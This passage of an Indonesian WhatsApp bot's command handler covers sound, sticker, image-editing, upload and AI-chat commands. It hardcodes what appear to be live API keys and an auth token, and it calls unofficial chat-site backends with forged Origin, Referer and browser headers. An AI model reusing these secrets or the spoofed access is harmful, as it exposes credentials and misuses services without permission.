    case 'sound94':
    case 'sound95':
    case 'sound96':
    case 'sound97':
    case 'sound98':
    case 'sound99':
    case 'sound100':
    case 'sound101':
    case 'sound102':
    case 'sound103':
    case 'sound104':
    case 'sound105':
    case 'sound106':
    case 'sound107':
    case 'sound108':
    case 'sound109':
    case 'sound110':
    case 'sound111':
    case 'sound112':
    case 'sound113':
    case 'sound114':
    case 'sound115':
    case 'sound116':
    case 'sound117':
    case 'sound118':
    case 'sound119':
    case 'sound120':
    case 'sound121':
    case 'sound122':
    case 'sound123':
    case 'sound124':
    case 'sound125':
    case 'sound126':
    case 'sound127':
    case 'sound128':
    case 'sound129':
    case 'sound130':
    case 'sound131':
    case 'sound132':
    case 'sound133':
    case 'sound134':
    case 'sound135':
    case 'sound136':
    case 'sound137':
    case 'sound138':
    case 'sound139':
    case 'sound140':
    case 'sound141':
    case 'sound142':
    case 'sound143':
    case 'sound144':
    case 'sound145':
    case 'sound146':
    case 'sound147':
    case 'sound148':
    case 'sound149':
    case 'sound150':
    case 'sound151':
    case 'sound152':
    case 'sound153':
    case 'sound154':
    case 'sound155':
    case 'sound156':
    case 'sound157':
    case 'sound158':
    case 'sound159':
    case 'sound160':
    case 'sound161':
    case 'sound162':
    case 'sound163':
    case 'sound164':
    case 'sound165':
    case 'sound166':
    case 'sound167':
    case 'sound168':
    case 'sound169':
    case 'sound170':
    case 'sound171':
    case 'sound172':
    case 'sound173':
    case 'sound174':
    case 'sound175':
    case 'sound176':
    case 'sound177':
    case 'sound178':
    case 'sound179':
    case 'sound180':
    case 'sound181':
    case 'sound182':
    case 'sound183':
    case 'sound184':
    case 'sound185':
    case 'sound186':
    case 'sound187':
    case 'sound188':
    case 'sound189':
    case 'sound190':
    case 'sound191':
    case 'sound192':
    case 'sound193':
    case 'sound194':
    case 'sound195':
    case 'sound196':
    case 'sound197':
    case 'sound198':
    case 'sound199':
    case 'sound200':
    case 'sound201':
    case 'sound202':
    case 'sound203':
    case 'sound204':
    case 'sound205':
    case 'sound206':
    case 'sound207':
    case 'sound208':
    case 'sound209':
    case 'sound210':
    case 'sound211':
    case 'sound212':
    case 'sound213':
    case 'sound214':
    case 'sound215':
    case 'sound216':
    case 'sound217':
    case 'sound218':
    case 'sound219':
    case 'sound220':
    case 'sound221':
    case 'sound222':
    case 'sound223':
    case 'sound224':
    case 'sound225':
    case 'sound226':
    case 'sound227':
    case 'sound228':
    case 'sound229':
    case 'sound230':
    case 'sound231':
    case 'sound232':
    case 'sound233':
    case 'sound234':
    case 'sound235':
    case 'sound236':
    case 'sound237':
    case 'sound238':
    case 'sound239':
    case 'sound240':
    case 'sound241':
    case 'sound242':
    case 'sound243':
    case 'sound244':
    case 'sound245':
    case 'sound246':
    case 'sound247':
    case 'sound248':
    case 'sound249':
    case 'sound250': {
    
try {
        let link = `https://raw.githubusercontent.com/Leoo7z/Music/main/${command}.mp3`
        await sock.sendMessage(m.chat, {
          audio: {
            url: link
          },
          mimetype: 'audio/mpeg',
          seconds: 99999999999,
          contextInfo: {
isForwarded: false, 
forwardingScore: 1, 
businessMessageForwardInfo: { businessOwnerJid: "0@newsletter" }, forwardedNewsletterMessageInfo: { newsletterName: `Â© ${namaBot}`, newsletterJid: "0@newsletter" }, 
externalAdReply: {
title: name,
body: `version â€¢ ${version}`,
thumbnailUrl: thumbnail2,
sourceUrl: `https://Uptime â€¢ ${runtime(process.uptime())}`,
mediaType: 1,
renderLargerThumbnail: false,
}}
        }, {
          quoted: fakeQuoted
        })
      } catch (err) {
        reply(`Terjadi kesalahan: ${err}`)
      }
    }
    break
case 'emojimix': {

let [emoji1, emoji2] = q.split`+`
if (!emoji1) return reply(`\n*Penggunaan Salah!*\nKetik .emojimix ğŸ˜„+ğŸ˜\n`)
if (!emoji2) return reply(`\n*Penggunaan Salah!*\nKetik .emojimix ğŸ˜„+ğŸ˜\n`)
reply("Proses...")
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await sock.sendImageAsSticker(m.chat, res.url, m, {
packname: namaBot,
author: namaBot,
categories: res.tags,
})
await fs.unlinkSync(encmedia)
}
 
}

break 
case "tourl2": {

  if (!quoted) return reply(`Fotonya Mana?`)
if (!/image|video|audio/.test(mime)) return reply(`Send/Reply Foto Dengan Caption ${cmd}`)
reply("Tunggu sebentar...")
let media = await sock.downloadAndSaveMediaMessage(quoted);
let response = await CatBox(media);
    try {
        const msg = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        // BODY ADALAH TEKS UTAMA PESAN
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: teks  // <-- sebelumnya kosong ('')
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            title: name || 'Vynaa-MD', // opsional
                            subtitle: '',
                            hasMediaAttachment: false
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: [
                                {
                                    name: 'cta_copy',
                                    buttonParamsJson: JSON.stringify({
                                        display_text: 'Copy Url',
                                        id: response,
                                        copy_code: response
                                    })
                                }
                            ]
                        })
                    })
                }
            }
        }, {});

        await sock.relayMessage(msg.key.remoteJid, msg.message, {
            messageId: msg.key.id
        });

    } catch (e) {
        console.error('âŒ Error mengirim tombol salin:', e);
    }
}
  break
case 'rbg':
case 'removebg':
case 'nobg': {

const q = m.quoted ? m.quoted : m;
    const mime = (q.msg || q).mimetype || '';
 
    if (!/image/.test(mime)) {
        return reply(`mana foto nya?`);
    }
 
    reply('Loading...');

    try {
        
        let media = await sock.downloadAndSaveMediaMessage(quoted);
        let directLink = await CatBox(media);
        
        const apiUrl = `https://kyyokatsurestapi.my.id/tools/removebg?url=${directLink}`;
        
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const imageBuffer = Buffer.from(response.data);
 
        const finalCaption = ``;
 
        await sock.sendMessage(m.chat, {
            image: imageBuffer,
            caption: ""
        }, { quoted: fakeQuoted });
 
    } catch (error) {
        console.error('Error di fitur aiedit:', error);
        reply(`âŒ Terjadi kesalahan saat memproses gambar.`);
    } finally {
        if (mediaPath && fs.existsSync(mediaPath)) {
            fs.unlinkSync(mediaPath);
        }
    }
}
break
case "pestebin": {

 if (!text) return reply(`ğŸ“Œ Contoh:\n${cmd} Ini contoh teks yang akan diunggah ke Pastebin`)

  const api_dev_key = 'h9WMT2Mn9QW-qDhvUSc-KObqAYcjI0he' // Ganti dengan API key dari akun Pastebin kamu
  const api_paste_code = text.trim()
  const api_paste_name = `Paste dari ${m.pushName || 'User'}`
  
  const data = new URLSearchParams({
    api_dev_key,
    api_option: 'paste',
    api_paste_code,
    api_paste_name
  })

  try {
    const res = await axios.post('https://pastebin.com/api/api_post.php', data.toString(), {
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
    })
    const url = res.data
    if (url.startsWith('Bad API request')) {
      return reply('âŒ Gagal membuat Pastebin:\n' + url)
    }
    reply(`âœ… *Berhasil membuat paste:*\n${url}`)
  } catch (e) {
    console.error(e)
    reply('âš ï¸ Gagal mengirim permintaan ke Pastebin.')
  }
}
break
case "getpp": {

let target = m.quoted ? m.quoted.sender : m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : null
if (!target) return reply("Reply/@tag target nya")

var ppuser
try {
ppuser = await sock.profilePictureUrl(target, 'image')
} catch (err) {
ppuser = 'https://files.catbox.moe/ejy4ky.jpg'
}
return sock.sendMessage(m.chat, {image: {url: ppuser}, caption: `Sukses mengambil profil @${target.split("@")[0]}`, mentions: target}, {quoted: fakeQuoted})
}
break
case "iqc": {

if (!text) return reply(`Contoh: ${command} kenapa sock ganteng`)
    
    await sock.sendMessage(m.chat, {image: {url: `https://api-faa.my.id/faa/iqc?prompt=${text}` }, caption: "" }, {quoted: fakeQuoted})
}
break
case "bratv2":
case "bratvid": {         

if (!text) return reply(`Contoh: ${command} hai`)
      if (text.length > 250) return reply(`Karakter terbatas, max 250!`)

      const words = text.split(" ")
      const tempDir = path.join(process.cwd(), 'cache')
      if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir)
      const framePaths = []
        for (let i = 0; i < words.length; i++) {
          const currentText = words.slice(0, i + 1).join(" ")

          const res = await axios.get(
            `https://aqul-brat.hf.space/?text=${encodeURIComponent(currentText)}`, {
              responseType: "arraybuffer"
            }
          ).catch((e) => e.response)

          const framePath = path.join(tempDir, `frame${i}.mp4`)
          fs.writeFileSync(framePath, res.data)
          framePaths.push(framePath)
        }

        const fileListPath = path.join(tempDir, "filelist.txt")
        let fileListContent = ""

        for (let i = 0; i < framePaths.length; i++) {
          fileListContent += `file '${framePaths[i]}'\n`
          fileListContent += `duration 0.5\n`
        }

        fileListContent += `file '${framePaths[framePaths.length - 1]}'\n`
        fileListContent += `duration 1.5\n`

        fs.writeFileSync(fileListPath, fileListContent)
        const outputVideoPath = path.join(tempDir, "output.mp4")

        execSync(
          `ffmpeg -y -f concat -safe 0 -i ${fileListPath} -vf "fps=30" -c:v libx264 -preset superfast -pix_fmt yuv420p ${outputVideoPath}`
        )

        await sock.sendImageAsSticker(m.chat, outputVideoPath, m, {
          packname: namaBot,
          author: namaBot,
        })

        framePaths.forEach((frame) => {
          if (fs.existsSync(frame)) fs.unlinkSync(frame)
        })
        if (fs.existsSync(fileListPath)) fs.unlinkSync(fileListPath)
        if (fs.existsSync(outputVideoPath)) fs.unlinkSync(outputVideoPath)
}
break
case "bratv1":
case "brat": {
  if (!text) return reply(`Contoh: ${cmd} hai`)
  if (text.length > 250) return reply(`Karakter terbatas, max 250!`)

  const encode = encodeURIComponent(text)
  const jion = `https://api.siputzx.my.id/api/m/brat?text=${encode}&isAnimated=false&delay=500`

  await sock.sendImageAsSticker(m.chat, jion, m, {
    packname: ".",
    author: ".",
  })
}
break
case "bratv3":
case 'bratgura': {
    if (!text) return reply(`Contoh: ${cmd} halo`)
    if (text.length > 250) return reply(`Max 250 karakter!`)

    try {
        reply('â³ Processing bratgura...')

        const dbDir = './database'
        if (!fs.existsSync(dbDir)) fs.mkdirSync(dbDir, { recursive: true })

        // 1ï¸âƒ£ brat
        const bratUrl = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}`
        const bratBuffer = await getBuffer(bratUrl)
        const bratPath = `${dbDir}/brat_${Date.now()}.png`
        fs.writeFileSync(bratPath, bratBuffer)

        // 2ï¸âƒ£ upload brat
        const bratPublic = await CatBox(bratPath)

        // 3ï¸âƒ£ nekolabs gura
        const guraUrl = `https://api.nekolabs.web.id/cnv/gura?imageUrl=${encodeURIComponent(bratPublic)}`
        const guraBuffer = await getBuffer(guraUrl)
        const guraPath = `${dbDir}/gura_${Date.now()}.png`
        fs.writeFileSync(guraPath, guraBuffer)

        // 4ï¸âƒ£ upload hasil gura
        const guraPublic = await CatBox(guraPath)

        // 5ï¸âƒ£ KIRIM STICKER (INI KUNCI ğŸ”‘)
        await sock.sendImageAsSticker(
            m.chat,
            guraPublic,
            m,
            {
                packname: 'Brat Gura',
                author: 'Bot'
            }
        )

        // cleanup
        fs.unlinkSync(bratPath)
        fs.unlinkSync(guraPath)

    } catch (e) {
        console.error(e)
        reply('âŒ Gagal membuat bratgura')
    }
}
break
case 'hdv2':
case 'reminiv2':
case 'enhancing':
case 'upscale': {
  if (!m.quoted && !m.message?.imageMessage) {
    return reply('âŒ Reply / kirim gambar dengan caption *upscale*')
  }

  reply('â³ Upscaling gambar, mohon tunggu...')

  try {
    // ambil media (reply atau langsung)
    const mediaMsg = m.quoted ? m.quoted : m
    const media = await sock.downloadMediaMessage(mediaMsg)

    // simpan sementara
    const path = `./database/sampah/upscale_${Date.now()}.jpg`
    fs.writeFileSync(path, media)

    // upload ke CatBox
    const foto = await CatBox(path)

    // proses upscale
    const api = await upscaler(path)
    if (!api.output) throw 'Gagal upscale gambar'

    // kirim hasil
    await sock.sendMessage(
      m.chat,
      {
        image: { url: api.output },
        caption: `âœ… *Upscale berhasil*\n\nğŸ†” Task: ${api.id}`
      },
      { quoted: fakeQuoted }
    )

    // hapus file sementara
    fs.unlinkSync(path)

  } catch (err) {
    reply('âŒ Terjadi kesalahan saat upscale')
    console.error(err)
  }
}
break
case 'hd':
case 'tohd':
case 'Enhanced':
case 'remini': {
  if (!quoted) return reply('Fotonya mana?')
  if (!/image/.test(mime)) return reply(`Send/Reply Foto dengan caption ${cmd}`)
  reply('Enhancing foto, tunggu sebentar...')

  try {
    let media = await sock.downloadAndSaveMediaMessage(quoted)
    let zion = await CatBox(media)

    let result = "https://api.deline.web.id/tools/hd?url="+zion
   

    await sock.sendMessage(
      m.chat,
      {
        image: { url: result },
        caption: name
      },
      { quoted: fakeQuoted }
    )

  } catch (e) {
    console.log(e)
    reply('Terjadi error')
  }
}
break
case 'smeme': case 'stickermeme': case 'stickmeme': {

await sock.sendMessage(m.chat, {react: {text: 'ğŸš€', key: m.key}})
if (!/webp/.test(mime) && /image/.test(mime)) {
if (!text) return reply(`Usage: ${cmd} text1|text2`)
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
mee = await sock.downloadAndSaveMediaMessage(quoted)
mem = await UploadFileUgu(mee)
meme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem.url}`
memek = await sock.sendImageAsSticker(m.chat,
 meme, m, {
 packname: `Whatsapp Bot ${namaOwner}`,
 })
} else {
reply(`Kirim/Balas Gambar Dengan Caption ${cmd} text1|text2`)
}
}
break
case 'stickerwm':
case 'wm':
case 'stikerwm':
case 'swm': {

if (!text) return reply("Text Nya mana?")
if (!/image|video/gi.test(mime)) return reply("dengan kirim media")
if (/video/gi.test(mime) && qmsg.seconds > 15) return reply("Durasi vidio maksimal 15 detik!")
var image = await sock.downloadAndSaveMediaMessage(qmsg)
await sock.sendImageAsSticker(m.chat,
 image, m, {
 packname: text,
 
 })
await fs.unlinkSync(image)
sock.sendMessage(m.chat, { react: { text: 'âœ…', key: m.key }})
}

break
case 'st2gif':
case 'togif': {
  if (!quoted) return reply('Stikernya mana?')
  if (!/image|video|audio/.test(mime))
    return reply(`Send/Reply stiker dengan caption ${cmd}`)

  reply('â³ Tunggu sebentar...')

  const mediaPath = await sock.downloadAndSaveMediaMessage(quoted)
  const mediaUrl = await CatBox(mediaPath) // hasil URL

  await sock.sendMessage(
    m.chat,
    {
      video: { url: mediaUrl }, // â¬…ï¸ WAJIB url
      gifPlayback: true,
      caption: 'âœ… Sticker / Video berhasil jadi GIF'
    },
    { quoted: fakeQuoted }
  )
}
break
case 'toimage':
case 'toimg': {
    if (!quoted) 
        return reply(`Reply sticker dengan caption *${cmd}*`)

    if (!/webp/.test(mime)) 
        return reply(`Balas sticker dengan caption *${cmd}*`)

    try {
        // pastikan folder tmp ada
        if (!fs.existsSync('./tmp')) fs.mkdirSync('./tmp', { recursive: true })

        const media = await sock.downloadAndSaveMediaMessage(quoted)
        const isAnimated = quoted.message?.stickerMessage?.isAnimated || false

        const outGif = `./tmp/${Date.now()}.gif`
        const outPng = `./tmp/${Date.now()}.png`

        // ===============================
        // STICKER VIDEO / ANIMATED â†’ GIF
        // ===============================
        if (isAnimated) {
            exec(
                `ffmpeg -i "${media}" -movflags faststart -pix_fmt rgb24 -vf "fps=15,scale=512:-1:flags=lanczos" "${outGif}"`,
                async (err) => {
                    fs.existsSync(media) && fs.unlinkSync(media)

                    if (err) {
                        console.error(err)
                        fs.existsSync(outGif) && fs.unlinkSync(outGif)
                        return reply('gunakan .togif')
                    }

                    if (!fs.existsSync(outGif))
                        return reply('âŒ File GIF tidak ditemukan')

                    const buffer = fs.readFileSync(outGif)
                    await sock.sendMessage(
                        m.chat,
                        {
                            video: buffer,
                            gifPlayback: true,
                            caption: 'âœ… Sticker video berhasil diubah ke GIF'
                        },
                        { quoted: fakeQuoted }
                    )

                    fs.unlinkSync(outGif)
                }
            )

        // ===============================
        // STICKER FOTO / STATIC â†’ IMAGE
        // ===============================
        } else {
            exec(
                `ffmpeg -i "${media}" -vf "scale=trunc(iw/2)*2:trunc(ih/2)*2" "${outPng}"`,
                async (err) => {
                    fs.existsSync(media) && fs.unlinkSync(media)

                    if (err) {
                        console.error(err)
                        fs.existsSync(outPng) && fs.unlinkSync(outPng)
                        return reply('âŒ Gagal mengkonversi sticker ke gambar')
                    }

                    if (!fs.existsSync(outPng))
                        return reply('âŒ File image tidak ditemukan')

                    const buffer = fs.readFileSync(outPng)
                    await sock.sendMessage(
                        m.chat,
                        {
                            image: buffer,
                            caption: 'âœ… Sticker foto berhasil diubah ke gambar'
                        },
                        { quoted: fakeQuoted }
                    )

                    fs.unlinkSync(outPng)
                }
            )
        }

    } catch (e) {
        console.error(e)
        reply('âŒ Terjadi kesalahan saat memproses sticker')
    }
}
break
case 'tovoicenote':
case 'tovn': {

if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Reply video/audio dengan caption ${cmd}`)
if (!quoted) return reply(`Reply video/audio dengan caption ${cmd}`)
//await loading()
var dl = await m.quoted.download()
sock.sendMessage(from, {audio: dl, mimetype: 'audio/mpeg', ptt: true }, {quoted: fakeQuoted })
}
break
case 'toaudio': {

if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Reply video/audio dengan caption ${cmd}`)
if (!quoted) return reply(`Reply video/audio dengan caption ${cmd}`)
//await loading()
var dl = await m.quoted.download()
sock.sendMessage(from, {audio: dl, mimetype: 'audio/mpeg', ptt: false }, {quoted: fakeQuoted })
}
break

case "tourl": { 

    if (!/image/.test(mime)) return reply("kirim/reply fotonya!");
    const { ImageUploadService } = require('node-upload-images');
    try {
        let mediaPath = await sock.downloadAndSaveMediaMessage(qmsg);
        const service = new ImageUploadService('pixhost.to');
  let buffer = fs.readFileSync(mediaPath);
  let { directLink } = await service.uploadFromBinary(buffer, namaBot+'.png');
  reply(directLink)
        await fs.unlinkSync(mediaPath);
    } catch (err) {
        console.error("Tourl Error:", err);
        reply("Terjadi kesalahan saat mengubah media menjadi URL.");
    }
}
break;

case "sticker": case "stiker": case "sgif": case "s": {

if (!/image|video/.test(mime)) return reply("Kirim foto nya!")
if (/video/.test(mime)) {
if ((qmsg).seconds > 15) return reply("Durasi vidio maksimal 15 detik!")
}
var media = await sock.downloadAndSaveMediaMessage(qmsg)
await sock.sendImageAsSticker(m.chat,
 media, m, {
 packname: `Whatsapp Bot ${namaOwner}`,
 
 })
await fs.unlinkSync(media)
}
break
case "idch":
case "cekidch": {

if (!text) return reply("linkchnya")
if (!text.includes("https://whatsapp.com/channel/")) return reply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await sock.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}
`
    const msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    // TEKS UTAMA PESAN
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: teks // pastikan variabel `teks` sudah didefinisikan
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        title: name || 'Vynaa-MD', // opsional
                        subtitle: '',
                        hasMediaAttachment: false
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
              {
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({
                  display_text: "Copy ID",
                  id: res.id,
                  copy_code: res.id
               })
                            }
                        ]
                    })
                })
            }
        }
    }, {});

    await sock.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });

} 
			break;
			
			/*
			   AI
*/
/**
 â€¢ Fitur: Overchat AI
 â€¢ Type: CJS (CASE)
 â€¢ BaseUrl: https://overchat.ai
 â€¢ Creator: convert by ChatGPT
*/

case 'overchatai':
case 'aioverchat': {
  if (!text)
    return reply(
      'Masukkan pertanyaan.\n\nContoh:\n' +
        prefix + command +
        ' jelaskan apa itu plankton'
    )

  try {
    const url = 'https://api.overchat.ai/v1/chat/completions'

    const payload = {
      chatId: crypto.randomUUID(),
      model: 'openai/gpt-4o',
      messages: [
        {
          id: crypto.randomUUID(),
          role: 'user',
          content: text
        }
      ],
      personaId: 'gpt-4o-landing',
      frequency_penalty: 0,
      max_tokens: 4000,
      presence_penalty: 0,
      stream: true,
      temperature: 0.5,
      top_p: 0.95
    }

    const headers = {
      'Content-Type': 'application/json',
      Accept: '*/*',
      'X-Device-Platform': 'web',
      'X-Device-Language': 'id-ID',
      'X-Device-Uuid': crypto.randomUUID(),
      'X-Device-Version': '1.0.44',
      Origin: 'https://overchat.ai',
      Referer: 'https://overchat.ai/chat/best-free-ai-chat',
      'User-Agent':
        'Mozilla/5.0 (Android 12; Mobile; rv:146.0) Gecko/146.0 Firefox/146.0'
    }

    const res = await axios.post(url, payload, {
      headers,
      responseType: 'stream'
    })

    let result = ''
    let buffer = ''

    await new Promise((resolve, reject) => {
      res.data.on('data', chunk => {
        buffer += chunk.toString()

        const lines = buffer.split('\n')
        buffer = lines.pop()

        for (let line of lines) {
          line = line.trim()
          if (!line.startsWith('data:')) continue

          const data = line.replace(/^data:\s*/, '')
          if (!data) continue

          if (data === '[DONE]') return resolve()

          try {
            const json = JSON.parse(data)
            const delta = json?.choices?.[0]?.delta?.content
            if (delta) result += delta
          } catch {}
        }
      })

      res.data.on('error', reject)
      res.data.on('end', resolve)
    })

    if (!result.trim()) return reply('âŒ Tidak ada jawaban yang dihasilkan')

    reply(result.trim())
  } catch (err) {
    console.error('[OVERCHAT ERROR]', err)
    reply('âŒ Terjadi kesalahan saat memproses permintaan')
  }
}
break
/**
  *Â» Nama :* â€” [ ZAHANAT AI ] â€”
  *Â» Type :* Plugin - CJS (CASE)
  *Â» Base Url :* https://chat.zahanat.ai
  *Â» Creator :* -ÆŠÎ±nÄoá´¡ã€…
**/


case 'zahanatai':
case 'zahanat': {
  if (!text)
    return reply(
      'Contoh:\n' + prefix + command + ' Halo, apa kabar?'
    )
  // simpan conversation per user
const userConversations = {}
  const userId = m.sender
  const isNewConversation = !userConversations[userId]
  const conversationId = userConversations[userId] || 0

  let res
  try {
    res = await fetch(
      'https://api.zahanat.ai/conversation/messagesV1/',
      {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization':
            'Token 798a27b3ef685534277b5bcba6b6b815de94ca58',
          'User-Agent': 'Mozilla/5.0 (Linux; Android 16)',
          'Origin': 'https://chat.zahanat.ai',
          'Referer': 'https://chat.zahanat.ai/'
        },
        body: JSON.stringify({
          user_id: 417,
          sender: 'user',
          message: text,
          new_conversation: isNewConversation,
          conversation_id: conversationId,
          web_search: true
        })
      }
    )
  } catch {
    return reply('âŒ Gagal menghubungi server Zahanat AI')
  }

  if (!res || !res.ok)
    return reply('âŒ Server Zahanat AI menolak permintaan')

  let raw
  try {
    raw = await res.text()
  } catch {
    return reply('âŒ Gagal membaca response dari server')
  }

  let fullMessage = ''

  for (const line of raw.split('\n')) {
    if (!line.startsWith('data: ')) continue
    try {
      const data = JSON.parse(line.slice(6))
      if (data.chunk) fullMessage += data.chunk
      if (data.conversation_id)
        userConversations[userId] = data.conversation_id
    } catch {}
  }

  if (!fullMessage)
    return reply('Zahanat AI tidak memberikan jawaban')

  reply(fullMessage)
}
break

// ===== RESET / CLEAR CHAT =====
case 'reset':
case 'clearchat': {
  const userId = m.sender

  if (!userConversations[userId])
    return reply('Belum ada conversation aktif')

  delete userConversations[userId]
  reply('âœ… Conversation berhasil direset')
}
break
/*
- [ Cloude ]
- Type : CJS (CASE)
- Base : https://claude.online
- Creator : Rizki
*/


case 'claudeai':
case 'claude': {
  if (!text) return reply('Masukkan pertanyaan!')

  const headers = {
    'accept': '*/*',
    'accept-encoding': 'gzip, deflate, br, zstd',
    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
    'connection': 'keep-alive',
    'content-type': 'application/json',
    'origin': 'https://claude.online',
    'referer': 'https://claude.online/',
    'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent':
      'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36'
  }

  let chat
  try {
    const res = await axios.post(
      'https://wewordle.org/gptapi/v1/web/turbo',
      {
        messages: [
          {
            content: text,
            role: 'user'
          }
        ]
      },
      { headers }
    )
    chat = res.data
  } catch (e) {
    return reply('âŒ Gagal menghubungi server Claude')
  }

  const out = chat?.message?.content
  if (!out) return reply('Jawaban kosong / diblokir server')

  reply(out)
}
break
/**
  *Â» Nama :* â€” [ HECK AI ] â€”
  *Â» Type :* Plugin - CJS (CASE)
  *Â» Base Url :* https://heck.ai
  *Â» Creator :* -ÆŠÎ±nÄoá´¡ã€…
**/

case 'aiheck':
case 'heckai': {
  if (!text) return reply('Masukkan pertanyaan!')
  
const axios = require('axios')
const { randomUUID } = require('crypto')

const MODELS = [
  'google/gemini-2.0-flash-001',
  'openai/gpt-4o-mini',
  'openai/gpt-4.1-mini',
  'x-ai/grok-3-mini-beta',
  'meta-llama/llama-4-scout',
  'openai/gpt-5-nano',
  'openai/gpt-5-mini'
]

  const payload = {
    model: MODELS[0], // bisa diganti
    question: text,
    language: 'Indonesian',
    sessionId: randomUUID(),
    previousQuestion: text,
    previousAnswer: null
  }

  let res
  try {
    res = await axios.post(
      'https://api.heckai.weight-wave.com/api/ha/v1/search',
      payload,
      {
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'text/event-stream',
          'Origin': 'https://heck.ai',
          'Referer': 'https://heck.ai/'
        },
        responseType: 'stream'
      }
    )
  } catch {
    return reply('âŒ Gagal menghubungi server Heck.ai')
  }

  let answer = ''
  let reading = false

  try {
    for await (const chunk of res.data) {
      const lines = chunk.toString().split('\n')

      for (const line of lines) {
        if (!line.startsWith('data:')) continue

        const data = line.replace('data:', '').trim()

        if (data === '[ANSWER_START]') {
          reading = true
          continue
        }

        if (data === '[ANSWER_DONE]') {
          reading = false
          break
        }

        if (reading && data) {
          answer += data + ' '
        }
      }
    }
  } catch {
    return reply('âŒ Error saat membaca stream')
  }

  answer = answer.trim()
  if (!answer) return reply('Jawaban kosong / diblokir server')

  reply(answer)
}
break
/**
  *Â» Nama :* â€” [ SANDBOX AI ] â€”
  *Â» Type :* Plugin - CJS (CASE)
  *Â» Base Url :* https://chatsandbox.com
  *Â» Creator :* -ÆŠÎ±nÄoá´¡ã€…
**/



case 'sandboxai':
case 'aisandbox':
case 'sandbox': {
  if (!text) return reply('Masukkan pertanyaan')
const CHARACTERS = [
  'deepseek',
  'deepseek-r1',
  'deepseek-r1-full',
  'gemini',
  'gemini-thinking',
  'gemma-3',
  'llama',
  'mistral',
  'mistral-large',
  'openai',
  'openai-gpt-4o',
  'openai-o1-mini'
]
  try {
    const res = await axios.post(
      'https://chatsandbox.com/api/chat',
      {
        messages: [text],
        character: 'openai' // bisa diganti dari CHARACTERS
      },
      {
        headers: {
          'content-type': 'application/json'
        },
        responseType: 'text'
      }
    )

    const out = String(res.data || '').trim()
    if (!out) throw 'Gagal mendapatkan jawaban'

    reply(out)
  } catch (e) {
    reply('âŒ Gagal menghubungi Sandbox AI')
  }
}
break
/**
  *Â» Nama :* â€” [ WRITECREAM AI ] â€”
  *Â» Type :* Plugin - CJS (CASE)
  *Â» Base Url :* https://www.writecream.com
  *Â» Creator :* -ÆŠÎ±nÄoá´¡ã€…
**/
case 'writecreamai': 
case 'aiwritecream': 
case 'writecream': {
  if (!text) return reply('Masukkan pertanyaan!')

  try {
    const form = new FormData()
    form.append('action', 'generate_chat')
    form.append(
      'query',
      JSON.stringify([
        { role: 'system', content: 'You are a helpful and informative AI assistant.' },
        { role: 'user', content: text }
      ])
    )
    form.append('link', 'writecream.com')

    const res = await axios.post(
      'https://www.writecream.com/wp-admin/admin-ajax.php',
      form,
      {
        headers: {
          ...form.getHeaders()
        }
      }
    )

    const out = res?.data?.data?.response_content
    if (!out) throw 'Gagal mendapatkan jawaban'

    reply(out.trim())
  } catch (e) {
    reply('âŒ Gagal menghubungi WriteCream')
  }
}
break
case 'turbo':
case 'turbochatai':
case 'aiturbochat':
case 'turbochat': {
  if (!text) return reply('Masukkan pertanyaan!')

  try {
    const res = await axios.post(
      'https://theturbochat.com/chat',
      {
        message: text,
        model: 'gpt-3.5-turbo',
        language: 'en'
      },
      {
        headers: {
          'content-type': 'application/json',
          'origin': 'https://theturbochat.com',
          'referer': 'https://theturbochat.com/',
          'user-agent':
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120 Safari/537.36',
          'accept': 'application/json, text/plain, */*'
        }
      }
    )

    const out = res?.data?.choices?.[0]?.message?.content
    if (!out) throw 'Gagal mendapatkan jawaban'

    reply(out.trim())
  } catch (e) {
